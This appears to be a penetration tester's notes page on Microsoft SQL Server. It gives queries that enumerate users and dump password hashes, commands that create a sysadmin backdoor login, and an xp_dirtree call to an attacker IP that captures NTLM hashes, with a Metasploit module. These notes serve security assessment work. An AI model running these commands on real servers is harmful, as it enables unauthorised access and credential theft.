Description: MSSQL is a relational database management system developed by Microsoft.

>[!info]
> Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).


# Basic Usage

## Default MS-SQL System Tables

- **master Database** : Records all the system-level information for an instance of SQL Server.
- **msdb Database** : Is used by SQL Server Agent for scheduling alerts and jobs.
- **model Database** : Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.
- **Resource Database** : Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.
- **tempdb Database** : Is a work-space for holding temporary objects or intermediate result sets.

## Basic MSSQL queries

```sql
# DB enumeration
select @@version;	                        # Get version

# User enumeration
SELECT system_user;							# Whoami
SELECT is_srvrolemember('bulkadmin');		# Bulkadmin?
SELECT is_srvrolemember('sysadmin');		# Sysadmin?
SELECT name FROM master..syslogins			# Enumerate other users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

# Schema and data enumeration
SELECT DB_NAME()							# Current database
SELECT name FROM master.dbo.sysdatabases	# Extract DBs
SELECT table_name FROM <DB>.information_schema.tables		                            # Extract tables
SELECT column_name FROM <DB>.information_schema.columns WHERE table_name = 'table-name'	# Extract columns
SELECT * FROM <DB>.dbo.<table>

# Search for credentials of hash
SELECT name, password_hash FROM sys.sql_logins				                            # Extract system hash
SELECT * FROM master.sys.server_principals
SELECT * FROM master.sys.syslogins

#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
```

## Extract MSSQL hashes from master.mdf

>With this is in mind, I started to research the process of safely recovering password hashes from a SQL Server instance when deployed in “Mixed Authentication Mode”, which provides value during an assessment and helps you to potentially access the SQL server via the front door with weak passwords. The obvious target to do this was by reviewing the configuration and metadata that Microsoft SQL Server stores in its master.mdf file. There were a number of challenges in getting this to work, which I have documented below for anyone else interested in implementing or improving on this method.

### NTLM Service Hash gathering

>[!warning]
>You can extract the **NTLM hash** of the user making the service authenticate against you.
>- [Executing SMB Relay Attacks via SQL Server using Metasploit](https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/)

You should start a **SMB server** to capture the hash used in the authentication ([SMB server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#SMB) or responder for example).

```sql
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```

# Post Exploitation

The user running MSSQL server will have enabled the privileged token [SeImpersonatePrivilege](../Web%20&%20Network%20Hacking/SeImpersonatePrivilege.md). You probably will be able to escalate to Administrator using this token.
